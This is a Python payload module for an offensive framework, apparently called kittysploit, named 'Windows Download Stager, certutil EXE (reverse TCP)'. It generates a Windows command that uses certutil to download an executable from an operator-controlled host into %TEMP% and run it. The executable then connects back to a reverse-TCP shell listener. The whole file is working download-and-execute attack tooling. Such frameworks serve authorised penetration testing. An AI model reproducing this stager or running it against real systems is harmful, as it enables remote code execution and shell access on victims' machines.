#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.download_stagers import build_certutil_download_exec, build_stager_url


class Module(Payload):
    __info__ = {
        "name": "Windows Download Stager, certutil EXE (reverse TCP)",
        "description": (
            "Downloads a hosted Windows EXE via certutil and executes it. "
            "Build the EXE with payloads/singles/cmd/multi/python_thin_stager "
            "(set compile_exe=true), host on stager_port as stager.exe."
        ),
        "category": PayloadCategory.CMD,
        "platform": Platform.WINDOWS,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Callback host (for URL hint)", True)
    lport = OptPort(4444, "Callback port embedded in EXE", True)
    stager_url = OptString("", "Full URL of hosted EXE", False)
    stager_port = OptInteger(8000, "Operator HTTP port when stager_url is empty", False, advanced=True)
    dest_path = OptString("%TEMP%\\ks.exe", "Local path for downloaded EXE", False, advanced=True)

    def generate(self):
        url = str(self.stager_url or "").strip()
        if not url:
            url = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.exe")
            print_info(f"stager_url not set — using {url}")
        return build_certutil_download_exec(url, str(self.dest_path or "%TEMP%\\ks.exe"))
